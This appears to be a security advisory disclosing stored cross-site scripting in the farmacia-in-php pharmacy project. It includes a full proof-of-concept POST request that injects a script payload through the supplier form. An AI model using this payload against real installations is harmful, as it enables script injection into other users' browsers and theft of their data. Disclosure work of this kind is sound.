# farmacia-in-php has Cross Site Scripting vulnerability in adicionar-produto.php

## supplier 
https://code-projects.org/farmacia-in-php-css-javascript-and-mysql-free-download/
## Vulnerability file
adicionar-produto.php

## describe
In adicionar-fornecedor.php.There are unrestricted cross site scripting attacks and injection attacks in the farmacia-in-php. The controllable parameters are as follows: nome parameter. This function will execute the user parameter without restriction into the echo statement. Malicious attackers can exploit this vulnerability to obtain sensitive information from clients

**Code analysis**    

Querying data from the database and storing it in the $reg\[$cont\]\['nome'\], and the echo nome is not filtered, resulting in the execution of XSS statements.

![image-20241128083927477](https://github.com/user-attachments/assets/575b0ac7-8215-478c-99f8-b9a5bd11756c)



## POC

```
POST /adicionar-fornecedor.php HTTP/1.1
Host: farmacia
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------343575567911858812221258670237
Content-Length: 1452
Origin: http://farmacia
Connection: close
Referer: http://farmacia/adicionar-fornecedor.php
Upgrade-Insecure-Requests: 1
Priority: u=0, i

-----------------------------343575567911858812221258670237
Content-Disposition: form-data; name="nome"

<script>alert('xss');</script>
-----------------------------343575567911858812221258670237
Content-Disposition: form-data; name="cpf"

1
-----------------------------343575567911858812221258670237
Content-Disposition: form-data; name="inscricao"

1
-----------------------------343575567911858812221258670237
Content-Disposition: form-data; name="endereco"

1
-----------------------------343575567911858812221258670237
Content-Disposition: form-data; name="numero"

1
-----------------------------343575567911858812221258670237
Content-Disposition: form-data; name="bairro"

11
-----------------------------343575567911858812221258670237
Content-Disposition: form-data; name="cidade"

1
-----------------------------343575567911858812221258670237
Content-Disposition: form-data; name="cep"

1
-----------------------------343575567911858812221258670237
Content-Disposition: form-data; name="uf"

1
-----------------------------343575567911858812221258670237
Content-Disposition: form-data; name="telefone"

1
-----------------------------343575567911858812221258670237
Content-Disposition: form-data; name="email"

1@outlook.com
-----------------------------343575567911858812221258670237
Content-Disposition: form-data; name="acao"


-----------------------------343575567911858812221258670237--

```

![image-20241127093510427](https://github.com/user-attachments/assets/d301c25b-df2d-43c7-8de4-f4bb2f5fe0a3)

Visit this URL to trigger the cross-site scripting vulnerability.

```
http://farmacia/adicionar-produto.php
```

**Result**

![image-20241126221600209](https://github.com/user-attachments/assets/4ac05f98-aa5b-4e97-a50c-3c8ed574c663)